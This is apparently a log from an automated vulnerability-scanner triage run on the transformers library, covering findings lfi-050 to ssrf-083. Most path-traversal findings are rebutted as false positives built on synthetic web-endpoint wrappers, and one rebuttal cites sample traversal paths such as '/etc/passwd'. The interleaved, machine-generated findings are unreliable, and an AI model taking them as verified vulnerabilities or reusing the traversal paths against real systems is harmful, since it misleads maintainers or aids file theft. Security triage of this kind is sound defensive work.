+    ? pattern matched (6 match(es))
+  [51/207] lfi-050 (update_version_in_file)
+    ? 10/10 — interesting
+    Assumptions: lfi-048...
+      4 assumptions (4 violable)
+    Adversary: rce-046...
+      2 assumptions (2 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-047...
+    x rebutted
+      reason: The provided source code does not contain any path traversal 
+vulnerability. The sink function `preprocess_val` (call chain 8) only applies 
+image transformations (e.g., `image.convert('RGB')`) and does not perform any 
+file path construction or file I/O. No call in the entire trace uses 
+`os.path.join`, `pathlib`, or similar path-builder functions with untrusted 
+input. The data flow annotations themselves indicate that static analysis could 
+not trace variable propagation, and the finding is based solely on pattern 
+evidence ("BridgeVerifier") rather than a verified exploit path. The call chain 
+includes functions from model quantization, expert swapping, and video 
+processing, none of which involve attacker-controlled file paths. Therefore, the
+reported vulnerability is not exploitable.
+    Evidence: lfi-047...
+    x rebutted
+      reason: The finding claims that `convert_model` in 
+`convert_ovis2_weights_to_hf.py` is reachable from attacker-controlled input, 
+but the provided source code does not support this. The simulated web endpoint 
+wrapper is artificial and not part of the actual library. The call chain 
+annotations show `__init__` as the entry point, but it does not call 
+`convert_model`. The taint path in the structured evidence jumps directly from 
+`convert_model` without demonstrating how an attacker would control its 
+`model_name_or_path` parameter in a real deployment. The conversion script 
+(`convert_ovis2_weights_to_hf.py`) is a utility intended for offline model 
+conversion, not exposed to external users. Without evidence that `convert_model`
+is invoked with untrusted data (e.g., via a public API endpoint), the 
+vulnerability is not authentically exploitable. The finding relies on an 
+unrealistic attack scenario and fails to prove reachability.
+    Evidence: rce-046...
+    ? 10/10 — interesting
+    Assumptions: lfi-050...
+    ? pattern matched (4 match(es))
+  [52/207] lfi-051 (get_version)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-049...
+      3 assumptions (3 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-048...
+    ? pattern matched (6 match(es))
+  [53/207] lfi-052 (count_lines)
+    x rebutted
+      reason: The reported sink function `get_tiny_model_names_from_repo` takes 
+no parameters and opens a hardcoded file path 
+`"tests/utils/tiny_model_summary.json"`. There is no user-controlled input 
+reaching this `open()` call, so path traversal is impossible. The static 
+analysis incorrectly flagged a pattern without verifying data flow. The function
+is a public API but has no parameters, making exploitation infeasible.
+    Evidence: lfi-048...
+    ? pattern matched (4 match(es))
+  [54/207] lfi-053 (_extract_definitions)
+    ? 10/10 — interesting
+    Assumptions: lfi-051...
+      4 assumptions (4 violable)
+    path bridge: 4 builder + 2 consumer
+    Adversary: lfi-049...
+      3 assumptions (3 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-050...
+    x rebutted
+      reason: The finding claims a path traversal / LFI vulnerability, but the 
+provided source code shows no untrusted user input reaching any file path 
+construction or file read operation. The entry function `build_model_overrides` 
+is called with `model_test_files`, which is derived from a fixed directory 
+(`MODELS_DIR`) via `get_models_and_test_files()`. No user-controlled value (such
+as the hypothetical `untrusted_user_input` in the simulated wrapper) is actually
+passed into the library. The only user-controlled parameters are from `argparse`
+(`--output_dir` and `--test_method_name`), which are used only for output paths 
+(JSON write) and filtering, not for constructing file read paths. Furthermore, 
+the code does not use `os.path.join` or any path-builder function with 
+attacker-controllable data. The simulated web endpoint is not part of the real 
+library; the actual code is a CLI script that does not accept remote user input.
+Therefore, the vulnerability is not exploitable.
+    Evidence: lfi-049...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability via path-builder
+functions, but the provided source code does not contain any path construction 
+(joinpath, os.path.join) and the file path argument (fname) is never 
+attacker-controlled. In `update_version_in_file`, `fname` comes from 
+`REPLACE_FILES.items()` which is a hardcoded dictionary (e.g., mapping patterns 
+to fixed file paths like `src/transformers/__init__.py`). The only user-supplied
+input is the `version` string (via `input()` or simulated API), which is used to
+replace pattern placeholders, not to choose or manipulate the file path. Even if
+the simulated wrapper passes untrusted input to `update_version_in_file`, the 
+target `fname` remains static and cannot be influenced. Therefore, no path 
+traversal is possible. The finding is based on an incorrect data flow 
+assumption.
+    Evidence: lfi-050...
+      4 assumptions (4 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-051...
+    ? pattern matched (4 match(es))
+  [55/207] lfi-054 (build_index)
+    ? pattern matched (6 match(es))
+  [56/207] lfi-055 (analyze_file)
+    ⚠ 10/10 — 3 contradiction(s)
+    Assumptions: lfi-052...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: lfi-053...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability via path-builder
+functions (e.g., os.path.join), but the provided source code contains no such 
+usage. The only file operations are hardcoded reads of REPLACE_FILES['init'] 
+(line ~156) and calls to global_version_update, remove_conversion_scripts, etc.,
+none of which accept user-controlled path input. The only user interaction is 
+input() at line ~180, which captures a version string (not a file path) and 
+passes it to global_version_update (not shown, but likely version manipulation, 
+not path building). The simulated web endpoint wrapper is not part of the actual
+library; the library functions (get_version, pre_release_work) are designed for 
+interactive or scripted releases, not exposed to untrusted HTTP input. The [DATA
+FLOW] annotation itself notes that 'Static engine could not trace variable 
+propagation' and there is no evidence of attacker-controlled data reaching any 
+path sink. Therefore, the reported vulnerability is not exploitable.
+    Evidence: lfi-051...
+    ? pattern matched (5 match(es))
+  [57/207] lfi-056 (build_date_data)
+    ? 10/10 — interesting
+    Assumptions: lfi-056...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: lfi-054...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: lfi-055...
+      6 assumptions (6 violable)
+    path bridge: 3 builder + 2 consumer
+    Adversary: lfi-053...
+      3 assumptions (3 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-052...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability in path-builder 
+functions, but the provided source code does not contain any path-builder calls 
+(e.g., os.path.join, pathlib.joinpath) with attacker-controlled input. The sink 
+function `_extract_definitions` uses `file_path.read_text()` where `file_path` 
+is obtained from `self.models_root.rglob("modeling_*.py")` in `build_index` – a 
+trusted, fixed directory. The simulated web wrapper in the comment is not part 
+of the actual library; the real library has no endpoint accepting untrusted 
+input. There is no data flow from user input to any file path. Therefore the 
+vulnerability is not exploitable.
+    Evidence: lfi-053...
+    ? pattern matched (6 match(es))
+  [58/207] lfi-057 (_load_definition_line_map)
+      3 assumptions (3 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-055...
+      5 assumptions (5 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-054...
+    x rebutted
+      reason: The finding is not exploitable because there is no data flow from 
+untrusted user input to any path construction or file system operation. The 
+simulated web endpoint is not part of the real library; the actual `build_index`
+function (line 419) takes no parameters and operates on `self.models_root`, 
+which is a pre-configured internal attribute, not attacker-controlled input. The
+other call chains (`main` in scan_skipped_tests.py and `_mp_fn` in 
+run_translation.py) are either command-line scripts that accept `argparse` 
+arguments (not web input) or simple wrappers. No untrusted input reaches the 
+sink, and no path-builder API (e.g., `os.path.join`, `pathlib`) is shown in the 
+provided code to be invoked with unsanitized user data. The claimed 
+vulnerability class (path traversal in join functions) is not present in the 
+actual code paths under the reported entry point.
+    Evidence: lfi-054...
+    x rebutted
+      reason: The finding claims LFI via path traversal in path-builder 
+functions (joinpath, os.path.join), but the provided source code does not 
+contain any calls to these functions. The call chain includes `analyze_file`, 
+`main` (from a script using argparse), and `_mp_fn` — none of which show a 
+path-builder sink. The data flow annotations explicitly state that the static 
+engine could not trace variable propagation and that semantics must be analyzed 
+manually. No actual vulnerable path construction is demonstrated. The system 
+wrapper is a hypothetical simulation not present in the actual library. 
+Therefore, the claimed vulnerability is not supported by the evidence.
+    Evidence: lfi-055...
+    x rebutted
+      reason: The finding claims LFI via path traversal in `count_lines` and 
+`os.path.join`, but the provided source code does not establish a realistic 
+attack path where an attacker controls the file path. The simulated wrapper at 
+the top is not part of the actual library; it is an artificial context added for
+analysis. The library code itself only shows `count_lines` used internally 
+inside `process_artifacts`, where the file path is constructed from a JSON file 
+read from `input_file`. There is no evidence that `input_file` or the contents 
+of the JSON (specifically `item['path']`) originate from an untrusted user. 
+Without a concrete, project-internal call chain that passes attacker-controlled 
+data into `process_artifacts` or directly into `count_lines`, the vulnerability 
+is not demonstrably exploitable. The static analysis annotations explicitly note
+that they could not trace variable propagation, reinforcing that the data flow 
+is incomplete. Therefore, the finding is rebutted.
+    Evidence: lfi-052...
+      3 assumptions (2 violable)
+    path bridge: 4 builder + 2 consumer
+    Adversary: lfi-056...
+    ? pattern matched (5 match(es))
+  [59/207] lfi-058 (get_list_of_models_to_deprecate)
+    ? pattern matched (5 match(es))
+  [60/207] lfi-059 (diff_is_docstring_only)
+    ? pattern matched (8 match(es))
+  [61/207] lfi-060 (diff_contains_doc_examples)
+    x rebutted
+      reason: The reported path traversal vulnerability is not exploitable 
+because the sink function `build_date_data` (line 586 in 
+`/tmp/transformers_src/utils/modular_model_detector.py`) does not accept any 
+user-controlled input. It derives `root_dir` from `transformers.__file__` and 
+uses a hardcoded relative path `docs/source/en/model_doc`. No attacker-supplied 
+value reaches the `Path.joinpath` call. The simulated web endpoint wrapper in 
+the finding is not part of the actual library code and misrepresents the 
+function signature. Therefore, there is no data flow from untrusted input to the
+path construction operation.
+    Evidence: lfi-056...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: lfi-057...
+    ? pattern matched (4 match(es))
+  [62/207] lfi-061 (get_impacted_files_from_tiny_model_summary)
+    ✓ 0/10 - safe
+    Assumptions: lfi-058...
+      5 assumptions (5 violable)
+    path bridge: 3 builder + 2 consumer
+    Adversary: lfi-057...
+    ✓ 0/10 - safe
+    Assumptions: lfi-061...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: lfi-059...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-060...
+    x rebutted
+      reason: The finding is invalid. The simulated web endpoint (`@app.post`) 
+is not part of the actual library source code; it was artificially introduced 
+for analysis. The real library functions (`_load_definition_line_map`, 
+`_resolve_definition_location`, `main`, `_mp_fn`) are internal utilities that do
+not accept attacker-controlled user input. The call chain shown is synthetic, 
+connecting unrelated modules (modular_model_detector.py → scan_skipped_tests.py 
+→ run_translation.py) without a real execution path. There is no mechanism by 
+which an untrusted user can supply a `relative_path` to 
+`_load_definition_line_map` in a production deployment. Therefore, the path 
+traversal (LFI) is not exploitable.
+    Evidence: lfi-057...
+    ? pattern matched (4 match(es))
+  [63/207] lfi-062 (get_all_doctest_files)
+      2 assumptions (2 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-059...
+      4 assumptions (4 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-058...
+      3 assumptions (3 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-060...
+    x rebutted
+      reason: The finding incorrectly assumes that attacker-controlled input can
+reach the sink `folder / filename` as an arbitrary path. In reality, `filename` 
+originates from git diff objects (`diff_obj.a_path` / `diff_obj.b_path`) in 
+`get_diff`. Git strictly enforces relative paths within the repository; paths 
+are normalized and cannot contain absolute references (e.g., `/etc/passwd`) or 
+malicious `../` sequences that escape the repo root. The simulated web wrapper 
+is not present in the actual codebase — `diff_is_docstring_only` is never called
+with arbitrary user input. Even if an attacker could influence a git commit, 
+git’s tree and diff handling prevent path traversal outside the repository 
+working directory. Therefore, no LFI vulnerability exists in this code.
+    Evidence: lfi-059...
+    x rebutted
+      reason: The reported path traversal / LFI vulnerability is not present in 
+the provided code. The function `get_list_of_models_to_deprecate` does not use 
+any attacker-controlled input to construct file paths. All file paths are 
+derived from the constant `models_dir` (set to `PATH_TO_REPO / 
+"src/transformers/models"`) and from iterating over existing filesystem entries 
+(`get_list_of_repo_model_paths`). The only user-controllable parameters are 
+`thresh_date`, `thresh_num_downloads`, etc., which are used for filtering dates 
+and download counts—not for path operations. The simulated wrapper passes an 
+`untrusted_user_input`, but this input is not actually consumed by the function 
+in any path-building context. There is no `os.path.join`, `pathlib.Path` 
+operation, or file open that takes untrusted data. Therefore, the finding is 
+invalid.
+    Evidence: lfi-058...
+    ? pattern matched (5 match(es))
+  [64/207] lfi-063 (get_new_doctest_files)
+      3 assumptions (3 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-061...
+    evidence found (8 match(es), 0 sink analyses)
+  [65/207] lfi-064 (get_doctest_files)
+    x rebutted
+      reason: The finding claims path traversal in path-builder functions 
+leading to LFI, but the sink (`diff_contains_doc_examples`) uses a filename that
+originates from `diff_obj.b_path` in git diff objects (line 393-396). This 
+filename is a relative path within the repository and is constrained by git's 
+internal validation — git does not allow file paths containing "../" or absolute
+components (e.g., via fsck checks). An attacker cannot create a git commit with 
+a path like `../../etc/passwd.py` because git rejects such entries. 
+Additionally, the `filename` parameter in `diff_contains_doc_examples` (line 
+220) is always a legitimate file path from the repo diff, not arbitrary user 
+input. The simulated web wrapper in the finding is inconsistent with the actual 
+function signature (expects 3 arguments, not 1). The real code is a test-fetcher
+utility for CI, not a network-exposed endpoint. Therefore, no realistic path 
+traversal attack exists.
+    Evidence: lfi-060...
+    ? 9/10 — interesting
+    Assumptions: lfi-062...
+    x rebutted
+      reason: The finding claims path traversal in path-builder functions, but 
+no untrusted user input reaches any path construction sink. The entry function 
+`get_impacted_files_from_tiny_model_summary` takes only a boolean parameter 
+(`diff_with_last_commit`), not an attacker-controlled string. All paths in the 
+code are hardcoded or derived from repository state (e.g., `folder / 
+"tests/utils/tiny_model_summary.json"`), not from external input. The simulated 
+web endpoint is not part of the actual library and does not reflect real data 
+flow. There is no `os.path.join` or `Path` operation with user-supplied 
+right-hand side that could trigger absolute path truncation or traversal. 
+Therefore the vulnerability is not exploitable.
+    Evidence: lfi-061...
+    ? pattern matched (10 match(es))
+  [66/207] lfi-065 (init_test_examples_dependencies)
+    ? pattern matched (8 match(es))
+  [67/207] lfi-066 (__init__)
+      6 assumptions (6 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-062...
+    ? 10/10 — interesting
+    Assumptions: lfi-065...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: lfi-063...
+    x rebutted
+      reason: The finding is not exploitable because there is no untrusted user 
+input reaching any path-building function. The entry point 
+`get_all_doctest_files` (line 434) takes no parameters; it uses hardcoded glob 
+patterns (`.glob("**/*.py")`, `.glob("**/*.md")`) and static path constants. 
+Similarly, `get_doctest_files` (line 494) operates on internal Git diffs, not 
+attacker-controlled data. The simulated web wrapper is not part of the actual 
+library; the real code is a test utility that never accepts external input. 
+Therefore, no path traversal or LFI can occur.
+    Evidence: lfi-062...
+    ? pattern matched (8 match(es))
+  [68/207] lfi-067 (extract_vocab_merges_from_model)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-064...
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: lfi-066...
+      4 assumptions (4 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-065...
+    x rebutted
+      reason: The finding is not exploitable. The source code shows that 
+`init_test_examples_dependencies` (line 803) has no parameters; it uses 
+hardcoded constants `PATH_TO_EXAMPLES` and `PATH_TO_REPO`. The simulated wrapper
+in the header artificially adds `untrusted_user_input` as an argument, but the 
+actual library implementation does not accept any user-controlled input. The 
+call chain: `create_module_to_test_map` optionally takes a `reverse_map` but 
+defaults to calling `create_reverse_dependency_map()` which calls 
+`init_test_examples_dependencies()` with no arguments. No attacker-controlled 
+data reaches any sink. The path manipulation functions (e.g., `glob`, 
+`relative_to`, `os.path.join`) operate only on constant paths. Therefore, there 
+is no path traversal vulnerability from untrusted input.
+    Evidence: lfi-065...
+      7 assumptions (7 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-064...
+    ? pattern matched (5 match(es))
+  [69/207] lfi-068 (save)
+    x rebutted
+      reason: The reported vulnerability is not exploitable because the actual 
+library functions (`get_doctest_files` and `infer_tests_to_run`) do not accept 
+any untrusted user input. The entry point `get_doctest_files` has no parameters 
+(line 494: `def get_doctest_files():`), and `infer_tests_to_run` takes only 
+`output_file` and `diff_with_last_commit` (line 953), neither of which 
+originates from user-controlled data in the provided code. The simulated wrapper
+(`@app.post("/api/v1/trigger")`) is a fabrication not present in the actual 
+source; the library is a test-fetcher utility that operates on git diffs, not on
+external HTTP requests. There is no data flow path from attacker-controlled 
+input to any path-building operation (`os.path.join`, etc.). The finding is 
+therefore based on a fictional entry point and does not reflect real-world 
+exploitability.
+    Evidence: lfi-064...
+      4 assumptions (4 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-066...
+      5 assumptions (5 violable)
+    path bridge: 3 builder + 1 consumer
+    Adversary: lfi-063...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability in path-builder 
+functions, but the provided source code does not contain any call to 
+`os.path.join`, `joinpath`, or similar path-construction APIs with untrusted 
+input. The annotated call chains end at abstract attribute bridges (e.g., 
+`self.original_tokenizer`) with no path manipulation. The `[DATA FLOW]` section 
+explicitly states the static engine could not trace variable propagation and 
+provides no concrete taint path to a dangerous sink. The entire code base shown 
+is a fragmented collection of function stubs and loops without any file path 
+construction from user input. Under 'Real-world context', no realistic 
+exploitation scenario is derivable. Therefore, the finding is not supported by 
+the evidence and must be rebutted.
+    Evidence: lfi-066...
+    ? pattern matched (6 match(es))
+  [70/207] lfi-069 (__iter__)
+    x rebutted
+      reason: The finding claims path traversal in path-builder functions, but 
+the source code shows no attacker-controlled input flowing into any file path 
+construction. All file paths (e.g., `folder / "utils/not_doctested.txt"`) are 
+built from `repo.working_dir` and fixed relative strings. The entry points 
+`get_new_doctest_files`, `get_doctest_files`, and `infer_tests_to_run` receive 
+only internal parameters (commit objects, booleans) – not user-supplied strings.
+The simulated web endpoint in the wrapper is not part of the actual library; the
+real code has no such endpoint. Therefore, there is no exploitable path 
+traversal. The static data flow annotations flagged no actual taint propagation 
+because none exists. The finding is invalid.
+    Evidence: lfi-063...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-067...
+    ? pattern matched (3 match(es))
+  [71/207] lfi-070 (save_vocabulary)
+    ? pattern matched (10 match(es))
+  [72/207] lfi-071 (_deserialize_index)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-068...
+      6 assumptions (6 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-067...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability in path-builder 
+functions, but the provided source code snippets contain no actual 
+path-construction operations (e.g., `os.path.join`, `pathlib.Path.joinpath`) 
+that incorporate untrusted input. The sink function 
+`extract_vocab_merges_from_model` at line 1923 shows only a trivial try-except 
+block for tiktoken import; no file path handling is visible. The static analysis
+engine itself notes that it could not trace variable propagation and recommends 
+manual semantic analysis, which was not performed. The call chain jumps through 
+unrelated utility functions without demonstrating how user-controlled data 
+reaches any file-path building step. Without concrete evidence of a path 
+traversal vector, the finding is unsupported and must be rebutted.
+    Evidence: lfi-067...
+    ? pattern matched (3 match(es))
+  [73/207] lfi-072 (save_vocabulary)
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: lfi-070...
+    ⚠ 7/10 — 1 contradiction(s)
+    Assumptions: lfi-071...
+      5 assumptions (5 violable)
+    path bridge: 2 builder + 2 consumer
+    Adversary: lfi-068...
+    ✓ 2/10 - safe
+    Assumptions: lfi-069...
+    x rebutted
+      reason: The finding lacks substantiated evidence that untrusted user input
+can reach a path traversal sink. The provided source snippets are from disparate
+parts of the transformers library, and the annotated data flow is incomplete 
+(the static engine failed to trace variable propagation). The simulated web 
+endpoint is not part of the actual library; there is no real-world entry point 
+that passes attacker-controlled input through the claimed call chain. The sink 
+in checkers.py:253 uses self._path, but there is no demonstration that this path
+is derived from user input via a vulnerable join. Without a concrete, traceable 
+path from untrusted input to a path-builder function, the vulnerability cannot 
+be confirmed as exploitable.
+    Evidence: lfi-068...
+    ? pattern matched (3 match(es))
+  [74/207] lfi-073 (save_vocabulary)
+      6 assumptions (6 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-071...
+      5 assumptions (5 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-070...
+    x rebutted
+      reason: The finding is not supported by the provided source code. The call
+chain shows a sequence of unrelated functions (jinja template compilation, model
+conversion, quantization, etc.) that do not form a coherent data flow from 
+untrusted input to a path traversal sink. The final sink (faiss.read_index) is 
+incomplete, and the critical function `_resolve_path` is not shown. The static 
+analysis itself states it could not trace variable propagation (e.g. 
+`self.properties` and `self.index_path`). There is no evidence that 
+attacker-controlled input reaches any path-building function. The simulated 
+wrapper is not part of the actual library and does not reflect a real endpoint. 
+Without a clear, connected data flow or concrete path-construction sink, the 
+vulnerability is not authentically exploitable based on this evidence.
+    Evidence: lfi-071...
+      5 assumptions (5 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-069...
+    x rebutted
+      reason: The finding is not substantiated by the provided source code. The 
+code snippets are fragmented and do not show a clear data flow from untrusted 
+user input to a path traversal sink. The call chain includes many unrelated 
+functions (e.g., chat template, weight loading, video processing) with no 
+demonstrated connection to the supposed sink `save_vocabulary`. The annotations 
+explicitly note that static engine could not trace variable propagation, and the
+actual implementation of `save_vocabulary` and its use of `os.path.join` are not
+visible. Without concrete evidence that attacker-controlled input reaches a 
+path-builder function in a vulnerable way, the claimed LFI is speculative and 
+cannot be confirmed as exploitable.
+    Evidence: lfi-070...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-072...
+    ? pattern matched (3 match(es))
+  [75/207] lfi-074 (save_vocabulary)
+    ? pattern matched (3 match(es))
+  [76/207] lfi-075 (__init__)
+    x rebutted
+      reason: The reported vulnerability is not supported by the provided source
+code. The sink identified as `__iter__` (file 
+`/tmp/transformers_src/utils/models_to_deprecate.py:144`) simply yields from 
+`self.model_list`, which is a list, not a file path. No `os.path.join`, 
+`joinpath`, or any path-building function is invoked in any of the call-chain 
+fragments. The data flow annotations mention a controlled `input_path` but no 
+actual code shows such an attribute being set or used in a path context. The 
+call-chain consists of unrelated utility functions (jinja template compilation, 
+quantization, video processing, etc.) that do not process attacker-controlled 
+input for file access. The simulated endpoint wrapper is speculative and not 
+backed by actual library logic. Therefore, there is no exploitable path 
+traversal or LFI vulnerability.
+    Evidence: lfi-069...
+    ? pattern matched (3 match(es))
+  [77/207] lfi-076 (save_vocabulary)
+      6 assumptions (6 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-072...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: lfi-073...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability in 
+`save_vocabulary` via `self.merges_file`, but the data flow from the simulated 
+entry point (`__init__` in `modular_model_detector.py`) is not demonstrated. The
+entry `__init__` shown has no parameters to accept attacker-controlled input; 
+the static engine notes 'no identifiable parameters' and could not trace 
+propagation. The call chain jumps through unrelated modules (Jinja template 
+compilation, model conversion, quantization) without any evidence that untrusted
+data reaches the tokenizer's `__init__` to set `self.merges_file`. The sink's 
+`self.merges_file` is normally loaded from a model path during tokenizer 
+instantiation, which is not attacker-controlled in the simulated context. 
+Without a concrete, traceable flow from untrusted input to the sink, the 
+vulnerability is not authentically exploitable.
+    Evidence: lfi-072...
+    ? pattern matched (3 match(es))
+  [78/207] lfi-077 (save_vocabulary)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-075...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-074...
+    ✓ 2/10 - safe
+    Assumptions: lfi-076...
+      5 assumptions (5 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-073...
+    x rebutted
+      reason: The finding lacks evidence that untrusted user input reaches the 
+sink `save_vocabulary`. The static analysis explicitly states it could not trace
+variable propagation (e.g., `self.properties`). The provided call chain is 
+implausible: it jumps between unrelated functions across different modules 
+(e.g., `_cached_compile_jinja_template`, `convert_model`, `from_pretrained`) 
+without a logical execution path. The simulated web endpoint is not part of the 
+actual library code; no realistic attacker entry point is demonstrated. 
+Therefore, the alleged path traversal vulnerability is not substantiated and is 
+a false positive.
+    Evidence: lfi-073...
+      5 assumptions (5 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-075...
+    ? pattern matched (3 match(es))
+  [79/207] lfi-078 (save_vocabulary)
+      6 assumptions (6 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-074...
+    x rebutted
+      reason: The finding claims an LFI/path traversal vulnerability via 
+path-builder functions, but the provided source code and data flow traces do not
+contain any call to `os.path.join`, `joinpath`, or any file path construction 
+function with user-controlled input. The sink is identified as an attribute 
+bridge (`self.entity_vocab`) that reads an attribute set in `__init__`, which is
+not a file operation. The simulated wrapper injects `untrusted_user_input` into 
+`__init__`, but the actual library `__init__` shown only sets logging levels and
+does not use the input. No subsequent code path demonstrates untrusted data 
+reaching a file path sink. The call chain lists mostly docstrings, imports, and 
+unrelated utility functions (e.g., `_cached_compile_jinja_template`, 
+`apply_chat_template`). There is no evidence that any of these functions accept 
+a user-controlled path or perform path traversal. Therefore, the vulnerability 
+is not exploitable; the pattern detection produced a false positive.
+    Evidence: lfi-075...
+    ? pattern matched (3 match(es))
+  [80/207] lfi-079 (save_vocabulary)
+    x rebutted
+      reason: The finding is not supported by the provided evidence. The data 
+flow annotations explicitly state that the static engine could not trace 
+variable propagation (e.g., self.properties). The call chain shown is long and 
+fragmented, with no clear demonstration that attacker-controlled input reaches 
+the sink `save_vocabulary`. The sink itself (tokenization_utils_sentencepiece.py
+line 237) takes a `save_directory` parameter, but there is no proof that this 
+parameter is derived from untrusted user input. The simulated web endpoint in 
+the system wrapper is not actual code from the library; it is an artificial 
+wrapper created for analysis. Without a concrete, traceable data path from an 
+attacker-controllable entry point to the vulnerable path-joining operation, the 
+vulnerability cannot be considered authentically exploitable. The pattern-based 
+detection (BridgeVerifier) alone is insufficient; actual code flow is required.
+    Evidence: lfi-074...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: lfi-077...
+      4 assumptions (4 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-076...
+    ? pattern matched (3 match(es))
+  [81/207] lfi-080 (_load_voice_preset)
+    x rebutted
+      reason: The finding lacks any concrete evidence that attacker-controlled 
+input reaches the `save_vocabulary` sink. The source code annotations show no 
+data flow from an untrusted entry point to the sink: the `__init__` entry is 
+listed with no parameters, the static engine explicitly states it could not 
+trace variable propagation, and the call chain consists of numerous unrelated 
+internal functions (e.g., `convert_model`, `from_pretrained`) with no clear 
+connection to user-supplied data. The simulated web wrapper is not part of the 
+actual library code and does not appear in the real source. Without a proven 
+taint path, the vulnerability is not authentically exploitable.
+    Evidence: lfi-076...
+    ? pattern matched (3 match(es))
+  [82/207] ssrf-081 (get_job_time)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-078...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: lfi-079...
+      3 assumptions (3 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-077...
+    ? 10/10 — interesting
+    Assumptions: ssrf-081...
+    ✓ 2/10 - safe
+    Assumptions: lfi-080...
+    x rebutted
+      reason: The finding claims a path traversal vulnerability in 
+`save_vocabulary`, but the supplied data flow is not credible. The call chain 
+jumps between unrelated functions across different modules (e.g., from 
+`__init__` in `modular_model_detector.py` to `_cached_compile_jinja_template` to
+`apply_chat_template` to `convert_ovis2_weights_to_hf` and finally to 
+`save_vocabulary`). These are not connected by actual control flow; the static 
+analysis likely aggregated code from unrelated files. There is no evidence that 
+untrusted user input reaches the `save_vocabulary` function or controls its path
+arguments (e.g., `save_directory` or `self.vocab_file`). The sink code itself is
+not shown, and the analysis explicitly states it could not trace variable 
+propagation. Without a demonstrated, realistic execution path from attacker 
+input to the dangerous path-construction operation, the finding is unsupported 
+and should be rebutted.
+    Evidence: lfi-077...
+    ? pattern matched (3 match(es))
+  [83/207] ssrf-082 (get_jobs)
+      4 assumptions (4 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-078...
+    x rebutted
+      reason: The finding lacks any concrete evidence that untrusted user input 
+reaches a path-builder function or file operation. The provided source code 
+snippets are heavily truncated and do not show an actual data flow from the 
+simulated entry point (`__init__`) to `save_vocabulary`. The call chain consists
+of unrelated functions (logging setup, Jinja template compilation, model 
+conversion, etc.) with no visible path traversal or file path construction. The 
+static engine itself states it could not trace variable propagation. The finding
+is based entirely on pattern matching without verified taint flow, and the 
+'SYSTEM WRAPPER' is a synthetic scenario not present in the actual library. 
+Therefore, the reported vulnerability is not authentically exploitable based on 
+the evidence provided.
+    Evidence: lfi-078...
+      6 assumptions (6 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-080...
+      5 assumptions (5 violable)
+    path bridge: 2 builder + 1 consumer
+    Adversary: lfi-079...
+    ? pattern matched (3 match(es))
+  [84/207] ssrf-083 (get_job_links)
+      6 assumptions (6 violable)
+    Evidence: ssrf-081...
+    x rebutted
+      reason: The finding claims LFI via path traversal in path-builder 
+functions, but the supplied code does not demonstrate a real, reachable 
+vulnerability. Specifically:
+
+1. **No actual path construction sink is shown.** The sink in 
+`processing_bark.py:185` only performs a dictionary lookup (`voice_preset_paths 
+= self.speaker_embeddings[voice_preset]`) and a `.get()` call. No 
+`os.path.join`, `pathlib`, or any filesystem path building appears in the 
+extracted snippet. The vulnerability class (path traversal in join functions) is
+not supported by the code presented.
+
+2. **Untrusted input flow is untraceable.** The entry point wrapper 
+`handle_request(untrusted_user_input: str)` calls 
+`__init__(untrusted_user_input)`, but the `__init__` code shown (just logging 
+setup) does not accept or use any parameter. The static analysis notes that it 
+could not trace `self.properties`. There is no evidence that attacker-controlled
+data ever reaches `self.speaker_embeddings` or the `voice_preset` variable.
+
